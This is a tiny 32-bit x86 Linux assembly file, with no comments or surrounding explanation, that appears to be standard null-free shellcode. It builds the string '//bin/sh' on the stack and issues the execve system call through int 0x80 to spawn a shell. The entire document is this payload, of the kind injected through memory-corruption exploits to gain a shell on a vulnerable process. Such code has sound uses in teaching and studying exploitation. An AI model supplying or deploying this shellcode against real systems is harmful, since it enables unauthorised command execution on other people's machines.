.global _start

.text

_start:
	xor	%ebx, %ebx
	xor	%edx, %edx
	xor	%ecx, %ecx
	push	%ecx
	push	$0x68732f6e
	push	$0x69622f2f
	mov	%esp, %ebx
	xor	%eax, %eax
	mov	$0xb, %al
	int	$0x80
